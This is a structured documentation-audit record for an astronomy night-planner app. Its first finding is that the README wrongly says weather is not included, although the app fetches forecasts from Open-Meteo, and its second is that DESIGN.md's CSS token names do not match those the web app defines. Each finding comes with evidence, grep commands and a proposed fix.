findings.file: doc: `README.md:183-185` ("Object example images are the only online content") and `README.md:195` ("Not included on purpose: satellite/planet positions, weather, ephemeris-grade lunar librations") vs reality: `static/index.html:59-72`, `static/js/weather.js:49-51`, `static/js/main.js:164,168`
findings.impact: :a user reading the feature list is told a shipped, user-visible feature does not exist (the weather chip + "fetch weather for the active site every time it opens" setting), and is told their machine talks to nothing but Wikipedia images while `api.open-meteo.com` is contacted for weather. The correct side is `landing/privacy.html:59-60` ("like the web version, loading weather sends your active site's coordinates to Open-Meteo").
findings.mechanism: :the weather panel was added after this README section was written; `README.md:115-117` already documents the update check, so line 183 contradicts the same file.
findings.evidence: :`static/index.html:59` `<button id="btnWeather" ... title="Weather for the active site - click to load">`, `:72` "When on, the app fetches weather for the active site every time it opens"; `static/js/weather.js:49` `"https://api.open-meteo.com/v1/forecast?latitude=" + lat ...`; `static/js/main.js:164 bindWeather();`, `:168 checkForUpdates();`. `git grep weather -- README.md` → only line 195 (the README never documents the feature).
findings.repro: :`Select-String README.md -Pattern 'weather'`; `Select-String static/js/weather.js -Pattern open-meteo`.
findings.requiredFix: :delete "weather" from the `README.md:195` not-included list, add the weather chip to the Night Planner feature list, and scope line 183 honestly ("weather (Open-Meteo, on request) and the once-per-start version check are the only other network calls; example images come from Wikipedia").

findings.title: `DESIGN.md` (mandatory before any UI work) gives the desktop/landing token names as the palette, but the web app defines a different name set; following the doc for web UI emits undefined custom properties.
findings.file: doc: `DESIGN.md:29-40` (table: `--text --dim --faint --border --border-soft --accent2 --accent-ink --gold --good --warn --bad --font-ui --font-mono`) + `DESIGN.md:43-46` ("use the tokens, never raw hex") vs reality: `web/style.css:3-13` and `web/themes.css:16-27`
findings.impact: :`DESIGN.md:3-7` claims to govern "everything else (web app, desktop app, landing page)". A web change written to the doc uses `var(--text)` / `var(--dim)` / `var(--border)` / `var(--faint)` / `var(--good)` / `var(--bad)`, none of which exist in `web/style.css` or `web/themes.css`; the property silently resolves to nothing and text/borders fall back to inherited or UA colours in the public planner. Cost is a broken-looking UI plus a debugging session, not a crash.
findings.mechanism: :the desktop (`static/style.css:2-44`) and the landing site (`landing/style.css:11-26`) use the long names; the web app was ported with the short ones (`--txt --muted --line --panel --amber --green --mono`). DESIGN.md's table documents the former and never maps them.
findings.evidence: :`Select-String web/style.css,web/themes.css -Pattern 'var\(--(text|dim|faint|border|border-soft|accent-ink|accent2|gold|good|warn|bad|font-ui|font-mono)\)'` → **0 matches**; the two `:root`/dome blocks define `--txt: #dbe9ff` / `--muted: #7f97b8` / `--line: #1d3152` / `--amber` / `--green` (web) against `--text: #dfe7ff` / `--dim: #93a3cc` / `--border` / `--gold` / `--good` / `--bad` (static + landing). Name sets overlap on `--bg`, `--panel`, `--accent`, `--radius` only.
findings.repro: :grep as above; then add `color: var(--text)` to any web rule and inspect computed style (no token to resolve).
findings.requiredFix: :add the web names next to each role in the `DESIGN.md` table (or a one-line "web app: `--txt`/`--muted`/`--line`/`--panel`/`--amber`/`--green`/`--mono`"), and say that the long names are desktop/landing only.
findings.counterArgument: :the table's *values* are the desktop dome block's, and an agent editing `web/themes.css` would see the local names in the same file. DESIGN.md also lists where the styles live (`:9-12`). Strong counter-argument, which is why this is medium rather than high - but the doc never states the mapping, and the web app is the surface every release touches.
